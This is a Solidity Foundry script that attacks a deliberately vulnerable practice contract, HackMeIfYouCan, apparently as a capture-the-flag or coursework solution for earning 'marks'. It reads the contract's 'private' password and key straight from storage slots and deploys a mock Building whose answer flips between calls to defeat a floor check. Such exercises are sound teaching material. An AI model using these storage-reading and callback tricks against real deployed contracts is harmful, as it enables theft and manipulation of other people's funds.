// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.7.0;

import {Script, console} from "forge-std/Script.sol";
import {HackMeIfYouCan} from "../src/HackMeIfYouCan.sol";

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

contract BuildingMock is Building {
    bool public lastFloorReached = false;

    function isLastFloor(uint256) external override returns (bool) {
        console.log("BuildingMock: isLastFloor called with lastFloorReached =", lastFloorReached);
        if (!lastFloorReached) {
            lastFloorReached = true;
            return false;
        } else {
            return true;
        }
    }
}

contract AttackHackMeIfYouCan is Script {
    HackMeIfYouCan public hackMeIfYouCan;
    BuildingMock public buildingMock;

    function run() public {
        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        address payable contractAddress = payable(vm.envAddress("CONTRACT_ADDRESS"));

        // Load the storage data for password and key
        bytes32 password = vm.load(contractAddress, bytes32(uint256(3)));
        bytes32 key = vm.load(contractAddress, bytes32(uint256(16)));

        vm.startBroadcast(privateKey);

        hackMeIfYouCan = HackMeIfYouCan(contractAddress);

        // Log the start of the attack
        console.log("Starting marks maximization...");

        // Step 1: Send ethers to obtain marks via contribute and receive
        (bool contributeSuccess,) = address(hackMeIfYouCan).call{value: 0.0001 ether}(abi.encodeWithSignature("contribute()"));
        console.log(contributeSuccess ? "contribute: success" : "contribute: failed");

        (bool receiveSuccess,) = address(hackMeIfYouCan).call{value: 0.001 ether}("");
        console.log(receiveSuccess ? "receive: success" : "receive: failed");

        // Step 2: Call addPoint function to try adding points
        console.log("Attempting to add point...");
        try hackMeIfYouCan.addPoint() {
            console.log("addPoint called");
        } catch Error(string memory reason) {
            console.log(reason);
        } catch {
            console.log("addPoint failed for unknown reason");
        }

        // Step 3: Attempt to send the correct key
        console.log("Attempting to send key...");
        try hackMeIfYouCan.sendKey(bytes16(key)) {
            console.log("sendKey called");
        } catch Error(string memory reason) {
            console.log(reason);
        } catch {
            console.log("sendKey failed for unknown reason");
        }

        // Step 4: Attempt to send the correct password
        console.log("Attempting to send password...");
        try hackMeIfYouCan.sendPassword(password) {
            console.log("sendPassword called");
        } catch Error(string memory reason) {
            console.log(reason);
        } catch {
            console.log("sendPassword failed for unknown reason");
        }

        // Step 5: Reach the last floor using a Building mock
        buildingMock = new BuildingMock();
        console.log("Attempting to go to the last floor...");
        console.log("BuildingMock address:", address(buildingMock));
        console.log("HackMeIfYouCan address:", address(hackMeIfYouCan));

        // Call the `goTo` function and capture low-level data
        (bool success, bytes memory data) = address(hackMeIfYouCan).call(abi.encodeWithSignature("goTo(uint256)", 100));
        if (success) {
            console.log("goTo called");
        } else {
            console.logBytes(data);
            console.log("goTo failed for unknown reason");
        }

        // Retrieve the marks for the current address
        uint256 marks = hackMeIfYouCan.getMarks(address(this));
        console.log("Marks after actions", marks);

        vm.stopBroadcast();
    }

    receive() external payable {}
}
